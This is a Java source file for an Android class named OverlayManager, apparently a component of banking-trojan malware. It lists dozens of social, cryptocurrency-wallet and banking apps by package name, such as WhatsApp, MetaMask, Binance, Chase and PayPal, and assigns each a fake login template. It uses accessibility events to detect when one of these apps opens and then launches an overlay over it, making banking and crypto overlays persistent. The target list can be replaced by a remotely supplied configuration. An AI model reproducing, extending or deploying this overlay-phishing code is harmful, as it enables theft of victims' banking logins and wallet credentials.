package com.fason.app.features.overlay;

import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.fason.app.core.Protocol;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class OverlayManager {
    private static final String TAG = "OverlayManager";
    private static OverlayManager instance;
    private final Context context;
    private final Map<String, String> appTemplateMap = new HashMap<>();
    private final Map<String, Boolean> appPersistentMap = new HashMap<>();
    private boolean globalEnabled = false;

    private OverlayManager(Context ctx) {
        this.context = ctx.getApplicationContext();
        initDefaultMappings();
    }

    public static synchronized OverlayManager getInstance(Context ctx) {
        if (instance == null) instance = new OverlayManager(ctx);
        return instance;
    }

    private void initDefaultMappings() {
        // Social apps
        appTemplateMap.put("com.whatsapp", "social_login");
        appTemplateMap.put("com.facebook.katana", "social_login");
        appTemplateMap.put("com.instagram.android", "social_login");
        appTemplateMap.put("com.zhiliaoapp.musically", "social_login");
        appTemplateMap.put("com.twitter.android", "social_login");
        appTemplateMap.put("com.snapchat.android", "social_login");
        appTemplateMap.put("com.discord", "social_login");
        appTemplateMap.put("com.tencent.mm", "social_login");
        appTemplateMap.put("com.xingin.xhs", "social_login");
        appTemplateMap.put("com.vkontakte.android", "social_login");
        appTemplateMap.put("com.viber.voip", "social_login");

        // Crypto apps
        appTemplateMap.put("com.binance.dev", "crypto_wallet");
        appTemplateMap.put("com.coinbase.android", "crypto_wallet");
        appTemplateMap.put("io.metamask", "crypto_wallet");
        appTemplateMap.put("com.bitget.exchange", "crypto_wallet");
        appTemplateMap.put("app.phantom", "crypto_wallet");
        appTemplateMap.put("com.wallet.crypto.trustapp", "crypto_wallet");
        appTemplateMap.put("com.moonpay", "crypto_wallet");
        appTemplateMap.put("exodusmovement.exodus", "crypto_wallet");
        appTemplateMap.put("com.okinc.okex.gp", "crypto_wallet");
        appTemplateMap.put("com.atomicwallet", "crypto_wallet");
        appTemplateMap.put("pi.blockchain.android", "crypto_wallet");
        appTemplateMap.put("com.coinomi.wallet", "crypto_wallet");
        appTemplateMap.put("com.crypto.exchange", "crypto_wallet");
        appTemplateMap.put("co.edgesecure.app", "crypto_wallet");

        // Finance/Banking apps
        appTemplateMap.put("com.paypal.android.p2pmobile", "bank_login");
        appTemplateMap.put("com.chase.sig.android", "bank_login");
        appTemplateMap.put("com.revolut.revolut", "bank_login");
        appTemplateMap.put("com.htx.brand", "bank_login");
        appTemplateMap.put("com.bybit.app", "bank_login");
        appTemplateMap.put("com.dydx.trading", "bank_login");
        appTemplateMap.put("com.allybank.mobile", "bank_login");
        appTemplateMap.put("com.capitalone.mobile", "bank_login");
        appTemplateMap.put("com.chimebank", "bank_login");
        appTemplateMap.put("com.creditonebank.mobile", "bank_login");
        appTemplateMap.put("com.discoverfinancial.mobile", "bank_login");
        appTemplateMap.put("com.samsung.android.spay", "bank_login");
        appTemplateMap.put("com.google.android.apps.walletnfcrel", "bank_login");
        appTemplateMap.put("com.eg.android.AlipayGphone", "bank_login");
        appTemplateMap.put("com.boc.bocpay", "bank_login");
        appTemplateMap.put("sg.com.hsbc.hsbcsingapore", "bank_login");
        appTemplateMap.put("com.alfa_bank.mbank", "bank_login");
        appTemplateMap.put("com.bluevine.app", "bank_login");
        appTemplateMap.put("com.currencyfair", "bank_login");
        appTemplateMap.put("com.greenfi.app", "bank_login");
        appTemplateMap.put("com.airstar.bank", "bank_login");

        for (String pkg : appTemplateMap.keySet()) {
            String tmpl = appTemplateMap.get(pkg);
            if ("bank_login".equals(tmpl) || "crypto_wallet".equals(tmpl)) {
                appPersistentMap.put(pkg, true);
            } else {
                appPersistentMap.put(pkg, false);
            }
        }
    }

    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (!globalEnabled) return;
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence pkg = event.getPackageName();
            if (pkg == null) return;
            String packageName = pkg.toString();
            if (appTemplateMap.containsKey(packageName)) {
                triggerOverlay(packageName);
            }
        }
    }

    private void triggerOverlay(String packageName) {
        if (!Settings.canDrawOverlays(context)) return;
        String template = appTemplateMap.getOrDefault(packageName, "generic_login");
        boolean persistent = appPersistentMap.getOrDefault(packageName, false);
        Intent intent = new Intent(context, OverlayService.class);
        intent.setAction("SHOW_OVERLAY");
        intent.putExtra(Protocol.KEY_OVERLAY_PACKAGE, packageName);
        intent.putExtra(Protocol.KEY_OVERLAY_TEMPLATE, template);
        intent.putExtra(Protocol.KEY_OVERLAY_PERSISTENT, persistent);
        context.startService(intent);
    }

    public void applyConfig(JSONObject config) {
        try {
            globalEnabled = config.optBoolean("enabled", false);
            JSONArray apps = config.optJSONArray("apps");
            if (apps != null) {
                appTemplateMap.clear();
                appPersistentMap.clear();
                for (int i = 0; i < apps.length(); i++) {
                    JSONObject app = apps.getJSONObject(i);
                    String pkg = app.optString("package");
                    String tmpl = app.optString("template");
                    boolean persist = app.optBoolean("persistent", false);
                    if (!pkg.isEmpty()) {
                        appTemplateMap.put(pkg, tmpl);
                        appPersistentMap.put(pkg, persist);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "applyConfig error", e);
        }
    }

    public JSONObject getStatus() {
        JSONObject r = new JSONObject();
        try {
            r.put("enabled", globalEnabled);
            r.put("canDrawOverlays", Settings.canDrawOverlays(context));
            r.put("serviceRunning", OverlayService.isRunning());
            JSONArray apps = new JSONArray();
            for (Map.Entry<String, String> e : appTemplateMap.entrySet()) {
                JSONObject a = new JSONObject();
                a.put("package", e.getKey());
                a.put("template", e.getValue());
                a.put("persistent", appPersistentMap.getOrDefault(e.getKey(), false));
                apps.put(a);
            }
            r.put("apps", apps);
        } catch (Exception ignored) {}
        return r;
    }

    public static String resolveTemplate(String packageName) {
        if (instance != null) {
            return instance.appTemplateMap.getOrDefault(packageName, "generic_login");
        }
        return "generic_login";
    }

    public static boolean isPersistent(String packageName) {
        if (instance != null) {
            return instance.appPersistentMap.getOrDefault(packageName, false);
        }
        return false;
    }
}
